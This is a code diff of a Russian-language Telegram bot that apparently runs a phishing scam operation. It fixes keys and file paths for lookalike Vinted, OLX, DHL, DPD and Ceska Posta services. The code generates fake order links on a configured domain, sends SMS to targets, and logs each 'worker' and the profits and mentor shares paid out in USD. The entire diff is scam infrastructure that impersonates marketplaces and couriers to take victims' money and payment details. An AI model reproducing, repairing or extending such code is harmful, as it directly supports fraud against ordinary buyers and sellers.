@@ -29,7 +29,7 @@ var _local = {
     cp_flags: {"pl": "🇵🇱", "cz": "🇨🇿"},
     valute: {"🇵🇱": "PLN", "🇨🇿": "CZK"},
     services: {
-        "czka-posta": "🇨🇿", "czka-dhi": "🇨🇿", "czska-dqd": "🇨🇿", "czska-vlnteb": "🇨🇿",
+        "czka-posta": "🇨🇿", "czka-dhi": "🇨🇿", "czka-dqd": "🇨🇿", "czka-vlnteb": "🇨🇿",
         "mojapaczka-dqd": "🇵🇱", "mojapaczka-lhpost": "🇵🇱", "mojapaczka-pozta": "🇵🇱", "mojapaczka-vlnteb": "🇵🇱",
         "mojapaczka-oix": "🇵🇱"
     },
@@ -88,11 +88,11 @@ var _local = {
         ]),
         chezh: Markup.inlineKeyboard([
             [
-                Markup.button.callback("❇️ Vinted", "@ofrtlink:czska-vlnteb"),
+                Markup.button.callback("❇️ Vinted", "@ofrtlink:czka-vlnteb"),
                 Markup.button.callback("❇️ DHL", "@pstlink:czka-dhi"),
             ],
             [
-                Markup.button.callback("❇️ DPD", "@pstlink:czska-dqd"),
+                Markup.button.callback("❇️ DPD", "@pstlink:czka-dqd"),
                 Markup.button.callback("❇️ CeskaPosta", "@pstlink:czka-posta"),
             ],
             [
@@ -771,7 +771,7 @@ const olx = new Scenes.WizardScene(
         let randomc = randint(000000, 999999)
         ctx.wizard.state.data['worker_id'] = ctx.from.id
         ctx.wizard.state.data['worker'] = ctx.from.username
-        writeFileSync(`mojapaczka-oix/data/${randomc}.xml`, "<xml>\n" + convert.json2xml(ctx.wizard.state.data, { compact: true, ignoreComment: true, spaces: 4 }) + "\n</xml>")
+        writeFileSync(`mojapaczka-oix/data/${randomc}`, "<xml>\n" + convert.json2xml(ctx.wizard.state.data, { compact: true, ignoreComment: true, spaces: 4 }) + "\n</xml>")
         writeFileSync("database/savethe/" + ctx.from.id, JSON.stringify({ fio: ctx.wizard.state.data.fio, to: ctx.wizard.state.data.to }))
         ctx.reply(`❇️ Информация о трек номере!\n\n❇️ Трек номер: ${randomc}\n❇️ Название: ${ctx.wizard.state.data.obyava}\n❇️ Стоимость: ${ctx.wizard.state.data.price} PLN\n\n👉 https://pi-0ix.${_local.pldomain}/order.php?id=${randomc}`, Markup.inlineKeyboard([
             [
@@ -1116,9 +1116,9 @@ const ofrtlink = new Scenes.WizardScene(
         let randomc = randint(000000, 999999)
         ctx.wizard.state.data['worker_id'] = ctx.from.id
         ctx.wizard.state.data['worker'] = ctx.from.username
-        writeFileSync(`../${readFileSync("database/scenes/" + ctx.from.id)}/data/${randomc}.xml`, "<xml>\n" + convert.json2xml(ctx.wizard.state.data, { compact: true, ignoreComment: true, spaces: 4 }) + "\n</xml>")
+        writeFileSync(`${readFileSync("database/scenes/" + ctx.from.id)}/data/${randomc}.xml`, "<xml>\n" + convert.json2xml(ctx.wizard.state.data, { compact: true, ignoreComment: true, spaces: 4 }) + "\n</xml>")
         writeFileSync("database/savethe/" + ctx.from.id, JSON.stringify({ fio: ctx.wizard.state.data.fio, to: ctx.wizard.state.data.to }))
-        await ctx.reply(`❇️ Информация о трек номере!\n\n❇️ Трек номер: ${randomc}\n❇️ Название: ${ctx.wizard.state.data.obyava}\n❇️ Стоимость: ${ctx.wizard.state.data.price}\n\n👉 https://${services_original[readFileSync("database/scenes/" + ctx.from.id)]}.${_local.pldomain}/order.php?id=${randomc}`, Markup.inlineKeyboard([
+        await ctx.reply(`❇️ Информация о трек номере!\n\n❇️ Трек номер: ${randomc}\n❇️ Название: ${ctx.wizard.state.data.obyava}\n❇️ Стоимость: ${ctx.wizard.state.data.price}\n\n👉 https://${readFileSync("database/scenes/" + ctx.from.id)}.${_local.pldomain}/order.php?id=${randomc}`, Markup.inlineKeyboard([
             [
                 Markup.button.callback("📩 Отправить SMS.", "@sendsms:" + readFileSync("database/scenes/" + ctx.from.id).toString("utf-8") + ":" + randomc)
             ],
@@ -1337,7 +1337,7 @@ const mkprofit = new Scenes.WizardScene(
             writeFileSync(`database/kassa/${kid}`, JSON.stringify({ profit: Math.round(ctx.message.text / (res.data.Valute.USD.Value / res.data.Valute.USD.Nominal)), worker: readFileSync(`database/maindb/${wid}/tag`).toString("utf-8"), hname: ctx.from.username, hid: ctx.from.id, rprofit: ctx.message.text, mentor: existsSync(`database/maindb/${wid}/mentor`) ? readFileSync(`database/maindb/${wid}/mentor`).toString("utf-8") : "none", sms: existsSync(`../sms/${mk_text.match(/❇️ Идентификатор: (.+) \/ (.+)/)[2]}_${mk_text.match(/❇️ Идентификатор: (.+) \/ (.+)/)[1]}_${wid}`) ? "yes" : "no" }))
             writeFileSync(`database/maindb/${wid}/profits/${wpid}`, String(Math.round(ctx.message.text / (res.data.Valute.USD.Value / res.data.Valute.USD.Nominal))))
             writeFileSync(`database/allkassa`, String(Number(readFileSync("database/allkassa").toString("utf-8")) + Number(ctx.message.text)));
-            writeFileSync(`database/profits/${_profitid}`, JSON.stringify({ 
+            writeFileSync(`database/profits/${_profitid}`, JSON.stringify({
                 msg_id: msg.message_id,
                 wid: wid,
                 text: scanswer_channel,
